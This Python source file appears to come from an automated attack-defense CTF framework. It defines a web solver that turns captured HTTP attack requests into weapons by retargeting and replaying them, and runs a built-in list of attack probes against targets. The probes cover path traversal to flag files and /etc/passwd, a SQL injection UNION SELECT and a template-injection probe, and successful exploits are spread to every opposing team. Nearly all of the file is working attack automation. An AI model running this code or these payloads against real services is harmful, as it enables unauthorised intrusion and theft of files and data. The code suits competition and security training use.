"""
WebSolver — the first category plugin.

Handles http services. Two paths:
  replay(exploit, target): reuse a known web attack against one target. If the
    exploit carries a raw captured HTTP request, it's reparsed and retargeted
    (Host + connection point swapped to this target) and resent — faithful
    capture->weaponize. If it carries a structured spec, that's used instead.
  solve(service, target): discovery — run a battery of generic web attacks
    (traversal to flag paths, SQLi union, SSTI, direct flag endpoints) against
    common parameters and look for a flag in the response. A hit becomes a
    reusable Exploit the engine fans out to every team.

All requests go through the scoped http_request tool, so the solver never leaves
the competition scope. Flag harvesting uses the configured flag format.
"""

from __future__ import annotations

import logging
import re

from offense.solver import Solver, Exploit, SolveResult

log = logging.getLogger("ctf.solver.web")


class WebSolver(Solver):
    category = "web"

    def __init__(self, flag_format: str | None = None):
        self.flag_re = re.compile(flag_format) if flag_format else None

    def can_handle(self, service) -> bool:
        return getattr(service, "proto", "tcp") == "http"

    # --- replay -------------------------------------------------------------

    def replay(self, ctx, exploit, target) -> SolveResult:
        if exploit.request:
            method, path, headers, body = self._parse_raw(exploit.request)
            headers["Host"] = f"{target.host}:{target.port}"
        elif exploit.spec.get("path"):
            s = exploit.spec
            method = s.get("method", "GET")
            path = s["path"]
            headers = dict(s.get("headers", {}))
            body = s.get("body", "")
        else:
            return SolveResult(ok=False, detail="no request or spec to replay")

        res = ctx.runner.run("http_request", {
            "host": target.host, "port": target.port,
            "method": method, "path": path, "headers": headers, "body": body,
        })
        if not res.ok:
            return SolveResult(ok=False, detail=res.output)
        flags = self._harvest(res.meta.get("body", "") if res.meta else res.output)
        return SolveResult(ok=bool(flags), flags=flags, detail="web replay")

    # --- discovery ----------------------------------------------------------

    _PROBES = [
        ("GET", "/flag", {}, ""),
        ("GET", "/flag.txt", {}, ""),
        ("GET", "/../../../../flag", {}, ""),
        ("GET", "/?id=1%27%20UNION%20SELECT%20flag%20FROM%20flags--", {}, ""),
        ("GET", "/search?q={{7*7}}", {}, ""),               # SSTI probe
        ("GET", "/index.php?page=../../../../etc/passwd", {}, ""),
    ]

    def solve(self, ctx, service, target) -> SolveResult:
        for method, path, headers, body in self._PROBES:
            res = ctx.runner.run("http_request", {
                "host": target.host, "port": target.port,
                "method": method, "path": path, "headers": headers, "body": body,
            })
            if not res.ok or not res.meta:
                continue
            body_text = res.meta.get("body", "")
            flags = self._harvest(body_text)
            if flags:
                exploit = Exploit(
                    id="", category="web", service=service.name,
                    spec={"method": method, "path": path, "headers": headers, "body": body},
                    origin="solver", meta={"probe": path},
                )
                return SolveResult(ok=True, flags=flags, exploit=exploit,
                                   detail=f"flag via {path}")
        return SolveResult(ok=False, detail="no web probe produced a flag")

    # --- helpers ------------------------------------------------------------

    def _harvest(self, text: str) -> list[str]:
        if not self.flag_re or not text:
            return []
        return list(dict.fromkeys(self.flag_re.findall(text)))   # unique, ordered

    @staticmethod
    def _parse_raw(raw: bytes):
        """Parse a raw HTTP request into (method, path, headers, body)."""
        text = raw.decode("latin-1", "replace")
        head, _, body = text.partition("\r\n\r\n")
        if not head:
            head, _, body = text.partition("\n\n")
        lines = head.splitlines()
        if not lines:
            return "GET", "/", {}, ""
        parts = lines[0].split()
        method = parts[0] if parts else "GET"
        path = parts[1] if len(parts) > 1 else "/"
        headers = {}
        for line in lines[1:]:
            if ":" in line:
                k, _, v = line.partition(":")
                headers[k.strip()] = v.strip()
        return method, path, headers, body
